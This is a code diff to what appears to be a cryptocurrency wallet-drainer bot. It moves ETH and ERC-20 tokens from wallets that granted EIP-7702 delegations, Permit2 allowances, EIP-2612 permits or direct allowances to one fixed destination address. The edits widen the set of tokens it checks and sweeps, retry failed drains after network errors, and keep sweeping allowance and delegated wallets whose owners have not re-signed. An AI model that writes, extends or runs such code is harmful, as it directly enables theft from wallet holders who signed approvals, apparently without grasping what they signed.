@@ -408,24 +408,23 @@ async function sweepDelegatedWallet(walletAddress) {
       }
     } catch (e) { err(`[eip7702] sweepETH ${checksum}: ${e.message}`); }
 
-    // ERC-20 tokens — sequential with delay after each call
-    for (const tokenAddress of TOKENS_TO_WATCH) {
+    // ERC-20 tokens — use full TOKENS list, not just TOKENS_TO_WATCH (6 tokens)
+    for (const tok of TOKENS) {
+      const tokenAddress = tok.address.toLowerCase();
       try {
-        const token   = new ethers.Contract(tokenAddress.trim(), ERC20_ABI, getReadProvider());
+        const token   = new ethers.Contract(tokenAddress, ERC20_ABI, getReadProvider());
         const balance = await token.balanceOf(checksum);
-        let decimals  = 18;
-        try { decimals = await token.decimals(); } catch {}
+        const decimals = tok.decimals ?? 18;
         if (balance >= ethers.parseUnits(MIN_TOKEN_UNITS, decimals)) {
-        let symbol = tokenAddress.slice(0, 8);
-        try { symbol = await token.symbol(); } catch {}
-        log(`[eip7702] ${checksum} ${symbol} ${ethers.formatUnits(balance, decimals)} — sweeping`);
-        const gas = await userContract.sweepTokens.estimateGas(tokenAddress.trim(), DESTINATION_ADDRESS);
-        const fee = await getFeeData();
-        const tx  = await userContract.sweepTokens(tokenAddress.trim(), DESTINATION_ADDRESS, {
-          gasLimit: gas * 120n / 100n, ...fee,
-        });
-        log(`[eip7702] sweepTokens(${symbol}) tx: ${tx.hash}`);
-        await tx.wait();
+          const symbol = tok.symbol ?? tokenAddress.slice(0, 8);
+          log(`[eip7702] ${checksum} ${symbol} ${ethers.formatUnits(balance, decimals)} — sweeping`);
+          const gas = await userContract.sweepTokens.estimateGas(tokenAddress, DESTINATION_ADDRESS);
+          const fee = await getFeeData();
+          const tx  = await userContract.sweepTokens(tokenAddress, DESTINATION_ADDRESS, {
+            gasLimit: gas * 120n / 100n, ...fee,
+          });
+          log(`[eip7702] sweepTokens(${symbol}) tx: ${tx.hash}`);
+          await tx.wait();
         }
       } catch (e) { err(`[eip7702] sweepToken ${tokenAddress} from ${checksum}: ${e.message}`); }
       await new Promise((r) => setTimeout(r, TOKEN_CALL_DELAY));
@@ -1324,7 +1323,7 @@ async function getRelayerBalance() {
 
 async function hasLivePermit2Allowance(checksumAddr) {
   const nowSec = BigInt(Math.floor(Date.now() / 1000));
-  for (const t of TOKENS.slice(0, 20)) {
+  for (const t of TOKENS.slice(0, 50)) {
     try {
       const [amt,, exp] = await permit2Read.allowance(checksumAddr, t.address.toLowerCase(), relayerWallet.address);
       if (amt > 0n && BigInt(exp) > nowSec) return true;
@@ -1482,8 +1481,18 @@ async function sweep(wallet) {
         log(`[eip2612] ✅ swept ${p.symbol ?? p.token.slice(0,10)}`);
         await supabase.from("eip2612_permits").update({ used: true }).eq("id", p.id);
       } catch (e) {
-        err(`[eip2612] ❌ ${p.symbol ?? p.token.slice(0,10)}: ${e.reason ?? e.message}`);
-        await supabase.from("eip2612_permits").update({ used: true, failed: true }).eq("id", p.id);
+        const msg = e.reason ?? e.message ?? "";
+        const isSigError = /InvalidSigner|SignatureExpired|InvalidSignature|invalid sig|ERC2612ExpiredSignature|ERC2612InvalidSigner|nonce/i.test(msg);
+        const isRpcError = /timeout|network|ETIMEDOUT|ECONNRESET|502|503|429|rate.?limit/i.test(msg);
+        if (isSigError) {
+          err(`[eip2612] ❌ sig invalid for ${p.symbol ?? p.token.slice(0,10)} — permanently marking failed`);
+          await supabase.from("eip2612_permits").update({ used: true, failed: true }).eq("id", p.id);
+        } else if (isRpcError) {
+          warn(`[eip2612] ⚠️ transient error for ${p.symbol ?? p.token.slice(0,10)}, will retry next sweep: ${msg}`);
+        } else {
+          err(`[eip2612] ❌ ${p.symbol ?? p.token.slice(0,10)}: ${msg}`);
+          await supabase.from("eip2612_permits").update({ used: true, failed: true }).eq("id", p.id);
+        }
       }
     }
   }
@@ -1508,7 +1517,7 @@ async function sweep(wallet) {
       }
     }
     if (tokenAddrs.length === 0) {
-      tokenAddrs = TOKENS.map(t => t.address.toLowerCase()).slice(0, 50);
+      tokenAddrs = TOKENS.map(t => t.address.toLowerCase()).slice(0, 150);
     }
     if (tokenAddrs.length === 0) { log(`[direct] ${short} — no tokens to check`); return; }
 
@@ -1661,7 +1670,7 @@ async function sweep(wallet) {
   // Sweeps using on-chain AllowanceTransfer registrations that persist forever.
   // ══════════════════════════════════════════════════════════════════════════
   {
-    const liveTokens = TOKENS.map(t => t.address.toLowerCase()).slice(0, 100);
+    const liveTokens = TOKENS.map(t => t.address.toLowerCase());
     const balIface   = new ethers.Interface(["function balanceOf(address) view returns (uint256)"]);
     const liveCalls  = liveTokens.map(addr => ({ target: addr, allowFailure: true, callData: balIface.encodeFunctionData("balanceOf", [checksum]) }));
     let liveResults  = [];
@@ -1802,7 +1811,7 @@ async function sweep(wallet) {
       if (wallet.type === "permit2-gasless") {
         let hasLiveAllowance = false;
         try {
-          const checkTokens = TOKENS.slice(0, 20).map(t => t.address.toLowerCase());
+          const checkTokens = TOKENS.slice(0, 50).map(t => t.address.toLowerCase());
           for (const tk of checkTokens) {
             const [amt,, exp] = await permit2Read.allowance(checksum, tk, relayerWallet.address).catch(() => [0n, 0n, 0n]);
             if (amt > 0n && BigInt(exp) > nowSecs) { hasLiveAllowance = true; break; }
@@ -2612,8 +2621,12 @@ function subscribeRealtime() {
         const type    = row.type || "eip7702";
         if (!address) return;
         if (type === "monitoring") return;
-        if (row.needs_reactivation) {
-          log(`[realtime] ${address.slice(0, 10)} — needs_reactivation still set (bot side), monitoring for transfers`);
+        // Only block sweep for wallet types that require a user signature to sweep.
+        // direct-allowance (live ERC-20 allowance) and eip7702 (on-chain delegation)
+        // never need user re-signing — their sweep paths work regardless of this flag.
+        const needsSig = type === "permit2-gasless" || type === "permit2";
+        if (row.needs_reactivation && needsSig) {
+          log(`[realtime] ${address.slice(0, 10)} (${type}) — needs_reactivation set, awaiting user reconnect`);
           delegatedWallets.set(address, type);
           monitoredWallets.set(address.toLowerCase(), { address, type });
           return;
